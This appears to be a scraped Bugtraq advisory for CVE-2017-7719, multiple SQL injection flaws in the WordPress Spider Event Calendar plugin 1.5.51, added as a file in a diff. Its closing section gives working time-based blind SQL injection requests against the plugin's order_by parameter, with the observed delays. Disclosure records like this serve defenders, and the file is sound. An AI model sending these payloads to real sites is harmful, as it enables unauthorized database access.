@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid97656<p><b><span style="font-size: 18pt;">WordPress Spider Event Calendar Plugin CVE-2017-7719 Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/97656/info">info</a><br><a href="http://www.securityfocus.com/bid/97656/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/97656/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/97656/solution">solution</a><br><a href="http://www.securityfocus.com/bid/97656/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				97656
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2017-7719<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 08 2017 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 18 2017 01:05AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Manuel GarcÃ­a CÃ¡rdenas
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Web-Dorado Spider Event Calendar 1.5.51 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Web-Dorado Spider Event Calendar 1.5.52 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit this issue through browser. <br/> <br/>The following example request is available: <br/> <br/>POST /wordpress/wp-admin/admin.php?page=SpiderCalendar HTTP/1.1 <br/> <br/>search_events_by_title=&amp;amp;page_number=1&amp;amp;serch_or_not=&amp;amp;nonce_sp_cal=1e91ab0f6b&amp;amp;_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3DSpiderCalendar&amp;amp;id_for_playlist=&amp;amp;asc_or_desc=1&amp;amp;order_by=id%2c(select*from(select(sleep(2)))a) <br/>(2 seconds of response) <br/> <br/>search_events_by_title=&amp;amp;page_number=1&amp;amp;serch_or_not=&amp;amp;nonce_sp_cal=1e91ab0f6b&amp;amp;_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fadmin.php%3Fpage%3DSpiderCalendar&amp;amp;id_for_playlist=&amp;amp;asc_or_desc=1&amp;amp;order_by=id%2c(select*from(select(sleep(30)))a) <br/>(30 seconds of response)
+	
+		<ul>
+</ul>
+</div>
